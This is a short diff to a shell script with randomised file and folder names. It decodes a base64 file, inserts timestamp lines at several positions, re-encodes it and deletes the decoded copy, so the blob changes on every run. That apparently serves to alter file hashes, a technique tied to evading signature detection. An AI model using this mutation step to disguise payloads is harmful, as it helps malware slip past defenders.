@@ -88,8 +88,14 @@ cd KkFCtZkeAP
 
 base64 -d avtPeqDKt645Arm > avtPeqDKt645Arm_decode
 rm avtPeqDKt645Arm
-echo $(date +%s)".cc" >> avtPeqDKt645Arm_decode
+sed -i 'N;1a'$(date +%s)'.cc' avtPeqDKt645Arm_decode
+sed -i 'N;10a'$(date +%s)'.cc' avtPeqDKt645Arm_decode
+sed -i 'N;100a'$(date +%s)'.cc' avtPeqDKt645Arm_decode
+sed -i 'N;1000a'$(date +%s)'.cc' avtPeqDKt645Arm_decode
+sed -i 'N;3000a'$(date +%s)'.cc' avtPeqDKt645Arm_decode
 base64 avtPeqDKt645Arm_decode > avtPeqDKt645Arm
+rm avtPeqDKt645Arm_decode
+
 
 cd ..
 
